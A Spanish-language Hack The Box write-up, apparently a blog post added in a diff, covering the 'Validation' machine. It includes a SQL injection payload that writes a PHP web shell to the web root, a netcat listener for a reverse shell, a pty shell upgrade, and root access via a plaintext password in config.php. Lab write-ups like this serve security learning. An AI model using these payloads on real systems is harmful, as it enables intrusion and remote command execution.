@@ -1,0 +1,78 @@
+I"K<p>Validation es una maquina linux de nivel fácil en hack the box pero que me pareció muy curiosa por su remote code execution.</p>
+
+<hr />
+<h1 id="enumeración">Enumeración</h1>
+
+<p>Tiramos el Nmap:</p>
+
+<p><img src="/assets/img/Validation/2022-07-11_171337.png" alt="nmap" /></p>
+
+<p>Vemos varios puertos abiertos, entre ellos el 80 y el 8080 vamos a echar un vistazo.</p>
+
+<p>Vemos una pagina que nos lleva a account.php, parece una especie de inscripción donde podemos meter nuestro nombre y tiene una lista de países.
+Ponemos un nombre y va almacenando los nombres que pongamos en el país seleccionado, tiene pinta de ser una base de datos, vamos a ver mas con <a href="https://portswigger.net/burp">burpsuite</a>.</p>
+
+<p>Interceptamos una petición y vemos que esta enviando el nombre que nosotros pongamos junto con el país elegido, también podemos ver que nos da una cookie de user que es el nombre que le hemos metido en md5. Vamos a probar si se acontece una inyección sql.</p>
+
+<p>Probamos poniendo una comilla en nuestro nombre, dejamos correr la petición y nada, no nos da ningún error, el campo user no es inyectable, pero si probamos con el campo país ahí si nos lanza un error, eso significa que el campo es inyectable. <a href="https://portswigger.net/web-security/sql-injection">Aquí</a> tenemos buena información sobre sqli.</p>
+
+<p>Después de descubrir los nombres de tablas columnas etc.. llegamos a una via muerta, nada util, los nombres de usuario y los userhash son los mismos que nos aparecían en la cookie de usuario, el nombre en md5.</p>
+
+<p><img src="/assets/img/Validation/2022-07-11_183053.png" alt="hashes" /></p>
+
+<hr />
+<h1 id="rce-mediante-sqli">Rce mediante Sqli</h1>
+
+<p>Podemos probar a ver si tenemos capacidad de incluir ficheros en la máquina, sabemos que la máquina ejecuta php y quizá podamos aprovecharnos de eso. Probamos con un union select:</p>
+
+<blockquote>
+  <p>username=test&amp;country=Brazil’ union select “test” into outfile “/var/www/html/test.txt”– -</p>
+</blockquote>
+
+<p>Metemos la palabra test dentro del archivo test.php en la ruta /var/www/html y después de recargar la pagina vemos que funciona.</p>
+
+<p><img src="/assets/img/Validation/2022-07-11_184527.png" alt="Test" /></p>
+
+<p>Bien¡ podemos meter un archivo en php y poder tener inyección remota de comandos¡.</p>
+
+<blockquote>
+  <p>username=test&amp;country=Brazil’ union select “&lt;?php system($_REQUEST[‘cmd’]) ?&gt;” into outfile “/var/www/html/test.php”– -</p>
+</blockquote>
+
+<p>Con esto tendremos el archivo test.php que al ser llamado ejecutara un request al sistema con la variable cmd que nosotros metamos. Probamos con un whoami y vemos que somos www-data, el rce funciona.</p>
+
+<p><img src="/assets/img/Validation/2022-07-11_194440.png" alt="Rce" /></p>
+
+<p>Solo nos queda ponernos en escucha con netcat en nuestra máquina por el puerto que queramos y lanzar una shell desde la paginas o el burpsuite.</p>
+
+<blockquote>
+  <p>nc -lnvp 1234</p>
+</blockquote>
+
+<p><img src="/assets/img/Validation/2022-07-11_194455.png" alt="Reverse" /></p>
+
+<p>Ya estamos dentro, usaremos python o para tener una consola util y podemos ver la flag de usuario.</p>
+
+<blockquote>
+  <p>python3 -c “<strong>import</strong>(‘pty’).spawn(‘/bin/bash’)”</p>
+</blockquote>
+
+<p>Información importante, <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md">Payloads all the things</a>, la biblia del hacking.</p>
+
+<h1 id="escalada-de-privilegios">Escalada de privilegios.</h1>
+
+<p>ya dentro de la máquina y con una consola real, procedemos a la enumeración.</p>
+
+<p>Podemos usar estos <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md">recursos</a>.</p>
+
+<p>Después de echar un vistazo en el propio directorio de www demos que hay una pagina config.php con contraseñas en claro. No puede ser tan fácil, probamos la contraseña como root con su y si¡ es asi de fácil somos root ya podemos ver la flag.</p>
+
+<p><img src="/assets/img/Validation/2022-07-11_195548.png" alt="Root" /></p>
+
+<hr />
+
+<p>Hasta aquí la máquina Validation una máquina con una escalada de privilegios muy sencilla pero una intrusión muy interesante para ver otras formas de sqli.</p>
+
+<p>!Nos vemos¡.</p>
+
+:ET
